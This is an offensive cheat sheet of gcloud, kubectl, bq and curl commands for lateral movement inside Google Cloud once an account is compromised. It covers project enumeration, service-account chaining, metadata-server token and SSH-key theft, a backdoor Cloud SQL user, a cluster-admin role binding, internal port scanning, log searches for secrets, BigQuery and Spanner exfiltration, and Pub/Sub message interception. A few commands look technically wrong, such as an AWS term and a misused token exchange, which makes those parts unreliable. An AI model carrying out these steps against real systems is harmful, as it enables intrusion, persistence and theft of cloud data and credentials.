# GCP Lateral Movement

Techniques for moving between resources and projects in Google Cloud Platform.

## Cross-Project Pivoting

### Find Accessible Projects

```bash
# List projects current service account can access
gcloud projects list --filter="parent.type:organization" --format="json"

# For each project, try operations
gcloud compute instances list --project={projectId}

# Use error responses to enumerate project IDs
# If you get "Permission denied", the project exists but you don't have access
# If you get "Project not found", the project doesn't exist

# Try common project naming patterns
for i in {1..100}; do
  gcloud compute instances list --project=prod-$i 2>&1 | grep -q "Permission denied" && echo "FOUND: prod-$i"
done

# Find projects accessible via specific roles
gcloud projects get-iam-policy {projectId} \
  --flatten="bindings[].members" \
  --filter="bindings.members:serviceAccount:{email}"
```

### Cross-Project Resource Access

```bash
# Cloud Storage buckets can be shared across projects
gsutil ls  # Lists buckets accessible to current account

# RDS instances might be accessible via VPC peering
gcloud sql instances list --project={otherProject}

# Cloud Compute instances in shared VPC
gcloud compute instances list --project={otherProject}

# BigQuery datasets shared with your project
bq ls --project_id={otherProject}

# Cloud Pub/Sub topics shared across projects
gcloud pubsub topics list --project={otherProject}
```

### Organization-Level Lateral Movement

```bash
# If you have organization-level service account
# You can access all projects in the organization

# Get organization ID
gcloud organizations list --format="json"

# List all projects in organization
gcloud projects list --filter="resourceLabels.organization=*"

# With organization-level permissions, you can:
# - Access any project's resources
# - Modify IAM for any project
# - Deploy to any project
```

## Service Account Chaining

### Chain Through Multiple Service Accounts

```bash
# Current account -> Target Service Account 1 -> Target Service Account 2

# Authenticate as current account
gcloud auth activate-service-account --key-file=current-key.json

# Impersonate Service Account 1
gcloud auth application-default print-access-token \
  --impersonate-service-account=sa1@project1.iam.gserviceaccount.com

# Check if SA1 has actAs permission on SA2
gcloud config set auth/impersonate_service_account sa1@project1.iam.gserviceaccount.com

gcloud iam service-accounts get-iam-policy sa2@project2.iam.gserviceaccount.com

# If SA1 can impersonate SA2, create token chain
TOKEN_SA1=$(gcloud auth application-default print-access-token \
  --impersonate-service-account=sa1@project1.iam.gserviceaccount.com)

# Use SA1's token to impersonate SA2
curl -X POST https://sts.googleapis.com/v1/token \
  -H "Content-Type: application/json" \
  -d '{
    "grant_type": "urn:ietf:params:oauth:grant-type:token-exchange",
    "audience": "//iam.googleapis.com/projects/{projectNumber}/locations/global/workloadIdentityPools/{pool}/providers/{provider}",
    "subject_token": "'${TOKEN_SA1}'",
    "subject_token_type": "urn:ietf:params:oauth:token-type:jwt"
  }'

# Now accessing resources as SA2
```

## VPC Lateral Movement

### Same VPC Network Access

```bash
# Instances in same VPC can communicate directly
gcloud compute instances list --format="table(name, networkInterfaces[0].networkIP)"

# From a compromised instance
curl http://10.0.0.5:8080  # Access other instance directly

# Check firewall rules
gcloud compute firewall-rules list --filter="network:{network}" --format="table(name,sourceRanges,allowed)"

# If firewall allows communication between instances
# Enumerate services on other instances
for ip in 10.0.0.{1..254}; do
  timeout 1 bash -c "echo >/dev/tcp/$ip/22" 2>/dev/null && echo "SSH: $ip"
done

# Access services on other instances
curl http://10.0.0.10:5432  # PostgreSQL
mysql -h 10.0.0.11 -u root  # MySQL
ssh cloud-user@10.0.0.12
```

### Cloud SQL over Internal IP

```bash
# Cloud SQL instances can have private internal IPs
gcloud sql instances list --format="json" | jq '.[] | {name, privateIp: .ipAddresses[0].ipAddress}'

# Instances in same VPC can connect to Cloud SQL over private IP
# Without going through the internet

# From instance in VPC, connect to Cloud SQL
CLOUD_SQL_IP=$(gcloud sql instances describe {instance} \
  --format="value(ipAddresses[0].ipAddress)")

psql -h $CLOUD_SQL_IP -U postgres -d {database}

# If you have Cloud SQL Editor role
# You can modify instance, databases, and users
gcloud sql users list --instance={instance}

# Create backdoor user
gcloud sql users create hacker --instance={instance} --password=p@ssw0rd

# Grant privileges
gcloud sql connect {instance} --user=root -c "GRANT ALL ON *.* TO 'hacker'@'%'"
```

## Kubernetes / GKE Lateral Movement

### From Compromised Pod to Cluster Control

```bash
# From compromised pod (via workload identity or service account)
SERVICEACCOUNT=$(cat /var/run/secrets/kubernetes.io/serviceaccount/username)

# Get pod's service account and check permissions
kubectl auth can-i get pods --as=system:serviceaccount:default:$SERVICEACCOUNT

# If pod has high permissions, escalate
kubectl create clusterrolebinding attacker-admin \
  --clusterrole=cluster-admin \
  --serviceaccount=default:$SERVICEACCOUNT

# Now you have cluster admin
kubectl get nodes
kubectl get secrets --all-namespaces
```

### Access GCP Resources from GKE

```bash
# GKE workload identity allows pods to access GCP services
# From pod, get GCP credentials

TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity?audience={projectId}.iam.gserviceaccount.com)

# Use token to access GCP
curl -H "Authorization: Bearer $TOKEN" \
  https://www.googleapis.com/compute/v1/projects/{projectId}/zones/us-central1-a/instances

# If pod's service account has GCP roles
# Can access Cloud Storage, BigQuery, etc.
gsutil ls gs://sensitive-bucket
```

## Compute Engine to Cloud Services

### Instance with Multiple Service Accounts

```bash
# Check instance's service accounts
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/?recursive=true

# Get token for different service account
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/{accountId}/token

# If instance has multiple service accounts
# Each may have different permissions
# Use the one with broader access

# Access BigQuery as compute service account
bq ls --project_id={projectId}

# Access Cloud Storage
gsutil ls
```

### Abuse GCP Instance Metadata

```bash
# SSH metadata often contains SSH keys for other instances
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/project/meta-data/ssh-keys

# Extract SSH key
curl -s -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/project/meta-data/ssh-keys | grep -oP '(?<==).*'

# Use key to SSH to other instances
ssh -i extracted-key user@other-instance

# Instance metadata includes:
# - Network configuration
# - Service account information
# - Custom metadata added by administrators
# - Startup scripts
```

## Application-Level Lateral Movement

### Cloud Run Service-to-Service Communication

```bash
# Cloud Run services within same project can communicate
# Get list of internal URLs
gcloud run services list --platform=managed --format="json" | jq '.[] | {name, url}'

# From one Cloud Run service, call another
curl https://admin-service-{random}.run.app/api/users

# If no authentication between services, direct access
# If authentication exists, use service account token
TOKEN=$(gcloud auth print-identity-token --audiences=https://admin-service-{random}.run.app)

curl -H "Authorization: Bearer $TOKEN" \
  https://admin-service-{random}.run.app/api/users
```

### Cloud Functions to GCP Services

```bash
# Cloud Functions have service account attached
# Can access any GCP service the account has permission for

# From Cloud Function code (Python)
from google.cloud import storage, sql_v1beta4

# Access Cloud Storage
storage_client = storage.Client()
buckets = storage_client.list_buckets()

# Access Cloud SQL
sql_admin = sql_v1beta4.SqlAdminServiceClient()
instances = sql_admin.list_instances(project='projects/{projectId}')

# If function has permissions, you have access
for instance in instances:
    print(instance.name)
```

## Database-Level Lateral Movement

### BigQuery Cross-Dataset Access

```bash
# Service account may have BigQuery Editor on project
# Can access any dataset and table

# List all datasets
bq ls --project_id={projectId}

# Check if dataset is accessible
bq show {dataset}

# If accessible, query any table
bq query --nouse_legacy_sql 'SELECT * FROM `{project}.{dataset}.{table}` LIMIT 1'

# Grant additional permissions on dataset
bq update \
  --set_iam_policy=policy.json \
  {dataset}

# Create new dataset for exfiltration
bq mk --dataset_id=exfil_data {projectId}:exfil_data

# Export sensitive data there
bq cp {project}:{dataset}.{table} {projectId}:exfil_data.stolen_table
```

### Cloud Spanner Inter-Database Access

```bash
# Check accessible Spanner instances
gcloud spanner instances list

# Get databases in instance
gcloud spanner databases list --instance={instance}

# Query database
gcloud spanner databases execute-sql {database} \
  --instance={instance} \
  --sql='SELECT * FROM users'

# If you have spanner.databases.create permission
# Create new database for exfil
gcloud spanner databases create exfil \
  --instance={instance}
```

## Pub/Sub Message Hijacking

### Subscribe to Topics Across Projects

```bash
# If service account has pubsub.subscriptions.create
# Create subscriptions to intercept messages

# List accessible topics
gcloud pubsub topics list --project={projectId}

# Create subscription to topic
gcloud pubsub subscriptions create attacker-sub \
  --topic=sensitive-topic \
  --project={projectId}

# Pull messages
gcloud pubsub subscriptions pull attacker-sub --auto-ack --project={projectId}

# Messages often contain:
# - Customer data
# - API keys in headers
# - Authentication tokens
# - Business logic information

# Pull all messages since subscription creation
gcloud pubsub subscriptions pull attacker-sub --auto-ack --limit=9999
```

## Log-Based Reconnaissance

### Cloud Logging for Lateral Movement Intel

```bash
# Check what resources and APIs are available
gcloud logging read "resource.type=gce_instance" --limit=50 --format=json

# Find recently accessed Cloud SQL instances
gcloud logging read "resource.type=cloudsql_database AND severity=INFO" --limit=50

# Look for credentials in logs
gcloud logging read "textPayload: password OR textPayload: secret OR textPayload: key" --limit=50

# Export logs for offline analysis
gcloud logging read "resource.type=gke_container" --limit=10000 --format=json > k8s-logs.json

# Search exported logs for service account information
grep -o "serviceAccount/[^\"]*" k8s-logs.json | sort -u
```
